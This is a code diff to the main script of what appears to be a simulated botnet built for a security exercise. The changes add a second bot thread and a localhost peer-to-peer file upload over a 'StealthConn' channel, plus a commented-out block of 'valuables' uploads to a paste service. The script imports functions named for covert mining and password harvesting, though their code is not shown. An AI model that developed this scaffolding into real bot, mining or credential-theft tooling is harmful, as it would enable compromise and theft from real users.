@@ -1,7 +1,9 @@
 import socket
 import time
 import threading
+import sys
 
+from lib.comms import StealthConn
 from lib.evil import bitcoin_mine, harvest_user_pass
 from lib.p2p import find_bot, bot_server
 from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables
@@ -34,8 +36,9 @@ def p2p_echo():
         print("Connection closed unexpectedly")
 
 if __name__ == "__main__":
+
     # Start a new thread to accept P2P echo or P2P upload requests
-    thr = threading.Thread(target=bot_server)
+    thr = threading.Thread(target=bot_server, args=("bot1",))
     # Daemon threads exit when the main program exits
     # This means the server will shut down automatically when we quit
     thr.setDaemon(True)
@@ -43,6 +46,49 @@ if __name__ == "__main__":
     # Wait for a small amount of time so that the output
     # doesn't play around with our "command prompt"
     time.sleep(0.3)
+
+
+    # bot2
+    thr2 = threading.Thread(target=bot_server, args=("bot2",))
+    thr2.setDaemon(True)
+    thr2.start()
+    time.sleep(0.3)
+
+
+
+
+    print("bot1 connecting to bot2 on port %d" % 1338)
+    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    conn.connect(("localhost", 1338))
+    sconn = StealthConn(conn, client=True)
+
+
+
+
+    sconn.send(bytes("FILE", "ascii"))
+    p2p_upload_file(sconn, "README")
+
+
+
+    """
+    upload_valuables_to_pastebot('hello.fbi')
+    upload_valuables_to_pastebot('hello.signed')
+    upload_valuables_to_pastebot('README')
+    upload_valuables_to_pastebot('README.md')
+    upload_valuables_to_pastebot('LICENSE')
+
+
+
+
+    download_from_pastebot('hello.fbi')
+    download_from_pastebot('hello.signed')
+
+    print("Files stored by this bot: %s" % ", ".join(filestore.keys()))
+    print("Valuables stored by this bot: %s" % valuables)
+
+    sys.exit()
+    """
+
 
     while 1:
         # Naive command loop
